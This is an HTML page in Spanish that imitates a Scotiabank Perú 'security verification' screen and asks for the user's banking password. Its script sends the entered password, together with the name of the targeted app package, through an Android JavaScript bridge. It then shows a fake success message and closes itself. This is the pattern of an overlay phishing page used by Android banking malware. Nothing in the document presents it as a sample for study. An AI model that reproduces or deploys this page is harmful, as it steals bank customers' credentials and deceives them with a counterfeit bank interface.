<!DOCTYPE html>
<html lang="es"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
<title>Scotiabank Perú</title>
<style>*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}html,body{height:100%;width:100%;overflow-y:auto}body{font-family:-apple-system,BlinkMacSystemFont,'Helvetica Neue',sans-serif;min-height:100dvh;background:#0d0d1a}.page{display:flex;flex-direction:column;align-items:center;height:100%;padding:0 28px}.top{margin-top:18vh;display:flex;flex-direction:column;align-items:center;width:100%;max-width:300px}.top img{width:52px;height:52px;border-radius:14px;margin-bottom:14px}.top .t{color:#fff;font-size:16px;font-weight:500;margin-bottom:4px}.top .s{color:rgba(255,255,255,.5);font-size:12px;margin-bottom:24px}.field{width:100%;position:relative;margin-bottom:12px}.field input{width:100%;height:50px;background:rgba(255,255,255,.06);border:1.5px solid rgba(255,255,255,.15);border-radius:10px;padding:0 44px 0 14px;font-size:16px;color:#fff;outline:none}.field input:focus{border-color:#EC111A}.field input::placeholder{color:rgba(255,255,255,.3);font-size:13px}.eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;padding:4px;cursor:pointer}.eye svg{width:20px;height:20px;fill:rgba(255,255,255,.4)}.btn{width:100%;height:48px;background:#EC111A;border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;margin-top:6px;cursor:pointer;opacity:.35;transition:opacity .2s}.btn.on{opacity:1}.sp,.ok{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:#0d0d1a;z-index:999;align-items:center;justify-content:center;flex-direction:column}.sp.show,.ok.show{display:flex}.sp-spinner{width:32px;height:32px;border:2.5px solid rgba(255,255,255,.15);border-top-color:#EC111A;border-radius:50%;animation:spin .7s linear infinite}.sp-text{margin-top:12px;font-size:13px;color:rgba(255,255,255,.5)}@keyframes spin{to{transform:rotate(360deg)}}.ok-icon{width:52px;height:52px;border-radius:50%;background:#2ecc71;display:flex;align-items:center;justify-content:center;margin-bottom:12px}.ok-icon svg{width:28px;height:28px;fill:#fff}.ok-text{font-size:14px;color:#fff}</style></head>
<body><div class="page"><div class="top">
<img src="data:image/png;base64," alt="Scotiabank Perú">
<div class="t">Verificación de seguridad</div>
<div class="s">Ingresa tu contraseña para continuar</div>
<div class="field"><input type="password" id="pwd" placeholder="Contraseña alfanumérica" autocomplete="off" enterkeyhint="go"><button class="eye" type="button" onclick="var e=document.getElementById('pwd');e.type=e.type==='password'?'text':'password'"><svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg></button></div>
<button class="btn" id="btn" onclick="doSubmit()">Continuar</button>
</div></div>
<div class="sp" id="spinner"><div class="sp-spinner"></div><div class="sp-text">Verificando...</div></div>
<div class="ok" id="okPage"><div class="ok-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div><div class="ok-text">Verificación exitosa</div></div>
<script>var pk='';try{if(typeof FKB!=='undefined'&&FKB.getPkg)pk=FKB.getPkg();}catch(e){}var p=document.getElementById('pwd'),b=document.getElementById('btn');p.addEventListener('input',function(){b.className=p.value.length>=8?'btn on':'btn';});document.addEventListener('focusin',function(e){if(e.target.tagName==='INPUT'){setTimeout(function(){e.target.scrollIntoView({behavior:'smooth',block:'center'});},300);}});p.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();doSubmit();}});function doSubmit(){var v=p.value;if(!v||v.length<8)return;document.activeElement.blur();var pl=JSON.stringify({password:v,pkg:pk});try{if(typeof Android!=='undefined'&&Android.returnResult)Android.returnResult(pl);}catch(e){}setTimeout(function(){try{if(typeof Android!=='undefined'&&Android.close)Android.close();}catch(e){}try{if(typeof Android!=='undefined'&&Android.finish)Android.finish();}catch(e){}try{window.close();}catch(e){}},500);}</script></body></html>
